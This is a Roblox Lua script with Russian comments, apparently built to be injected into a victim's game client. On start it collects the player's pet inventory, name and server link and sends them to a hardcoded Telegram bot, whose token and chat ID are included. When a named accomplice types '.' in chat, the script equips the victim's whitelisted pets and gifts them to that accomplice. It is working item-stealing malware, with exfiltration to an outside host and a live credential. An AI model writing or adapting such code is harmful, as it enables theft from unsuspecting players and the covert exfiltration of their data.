local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sfdgbzdfsb"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК
local WHITELIST = {"Hamster"}

-- 🔎 Поиск питомцев во всех контейнерах
local function getAllPets()
    local pets = {}
    local containers = {
        player:FindFirstChild("Backpack"),
        player.Character
    }

    for _, container in ipairs(containers) do
        if container then
            for _, item in ipairs(container:GetChildren()) do
                if item:IsA("Tool") then
                    -- Гибкий парсинг имени
                    local weight, age = item.Name:match("%[(%d+%.?%d*) KG%].*%[Age (%d+)%]") or
                                       item.Name:match("%[(%d+%.?%d*) kg%].*%[Age (%d+)%]")
                    
                    if weight and age then
                        local petName = item.Name:match("^([^%[]+)") or item.Name
                        petName = petName:gsub("%s+$", "")
                        
                        table.insert(pets, {
                            name = petName,
                            fullName = item.Name,
                            weight = tonumber(weight),
                            age = tonumber(age),
                            object = item,
                            isWhitelisted = table.find(WHITELIST, petName) ~= nil
                        })
                    end
                end
            end
        end
    end
    
    return pets
end

-- 📜 Формируем список для уведомления (ВСЕ питомцы)
local function getFullPetsList(pets)
    if #pets == 0 then return "❌ Нет питомцев в инвентаре" end
    
    local list = {}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✅" or "❌"
        table.insert(list, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
    end
    
    return table.concat(list, "\n")
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    pcall(function()
        game:HttpGet(url)
    end)
end

-- 🔗 Получить ссылку на сервер
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    if jobId and jobId ~= "" then
        return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
    end
    return "https://www.roblox.com/games/"..placeId
end

-- 🏁 ИНИЦИАЛИЗАЦИЯ: сразу после инжекта отправляем полное уведомление
local function sendInitialNotification()
    local pets = getAllPets()
    local petsList = getFullPetsList(pets)
    local message = 
        "🔔 Игрок "..player.Name.." запустил скрипт\n\n"..
        "📦 Полный инвентарь:\n"..petsList.."\n\n"..
        "🔗 Ссылка на сервер:\n"..getServerLink()
    sendToTelegram(message)
end

sendInitialNotification()

-- 🎯 Основная функция передачи
local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Нет питомцев для передачи")
        return
    end

    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER)
    if not targetPlayer then
        sendToTelegram("❌ Целевой игрок не найден: "..TARGET_PLAYER)
        return
    end

    local petService = ReplicatedStorage:FindFirstChild("PetGiftingService")
    if not petService then
        sendToTelegram("❌ Сервис передачи не найден")
        return
    end

    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            -- Экипировка с проверкой
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid:EquipTool(pet.object)
                task.wait(2)
            end
            
            -- Передача
            petService:FireServer("GivePet", targetPlayer)
            transferred += 1
            task.wait(2)
        end
    end

    -- Обновляем список после передачи
    local updatedPets = getAllPets()
    local report = {
        "🏁 Отчет о передаче:",
        "📤 Передано: "..transferred.." из "..#pets,
        "",
        "📦 Текущий инвентарь:",
        getFullPetsList(updatedPets),
        "",
        "🔗 Ссылка: "..getServerLink()
    }
    
    sendToTelegram(table.concat(report, "\n"))
end

-- 👂 Слушатель чата
Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startPetTransfer()
    end
end)
